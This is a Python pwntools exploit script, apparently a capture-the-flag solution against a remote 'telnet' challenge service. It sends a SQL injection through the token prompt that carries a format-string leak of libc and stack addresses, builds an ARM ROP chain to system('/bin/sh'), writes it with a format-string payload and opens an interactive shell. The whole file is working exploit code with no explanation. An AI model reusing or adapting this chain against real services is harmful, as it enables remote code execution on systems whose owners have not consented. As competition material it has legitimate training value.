from pwn import *
import sys
from math import floor

context.log_level='warning'

#p = process('bash run.sh',shell=True)
p = remote('telnet.2021.3k.ctf.to',8080)

binary=ELF('./telnet')
libc = ELF('./lib/libc.so.6')

## LEAK
payload="'UNION(SELECT(1),('a'),('adminnnn%89$p-%84$p'))#"
p.sendlineafter('token > ',payload)
p.sendlineafter('> \n> ','ls')

LeakLine = p.recvline().decode('utf-8').replace('adminnnn','').strip().split('-')

libc_base = int(LeakLine[0],16) - 53164
print("[+] LIBC_BASE "+hex(libc_base))

stackPointer = int(LeakLine[1],16) - 500 - 496 - 12*4
print("[+] STACK_PTR "+hex(stackPointer))

p.sendlineafter('> ','exit')
p.sendlineafter('Exit(y/n)? >','n')

binsh = libc_base + 0x12bb6c
print("[*] BINSH_STR "+hex(binsh))

systemaddr = libc_base + libc.symbols['system']
print("[*] SYSTEM    "+hex(systemaddr))

# WRITING ROPCHAIN AND JUMPING TO IT
# 0x000da9c0: pop {r0, r1, r2, r3, ip, lr}; bx ip; 
gadget1 = 0x000da9c0+libc_base
print("[*] GADGET  1 "+hex(gadget1))
ROPCHAIN = p32(gadget1) + b"A"*4+ p32(binsh)+ b"A"*12+ p32(systemaddr)

writes = {stackPointer+4*3: gadget1}
fmt=fmtstr_payload(floor(12+(len(ROPCHAIN)/4)), writes, 8+len(ROPCHAIN),write_size='short')
fmt = (b'adminnnn'+ROPCHAIN+fmt).hex()

payload="'union(select(1),('aa'),CONVERT((0x"+fmt+")USING`latin1`))#"

p.sendlineafter('token > ',payload)
p.sendlineafter('> \n> ','ls')

p.interactive()
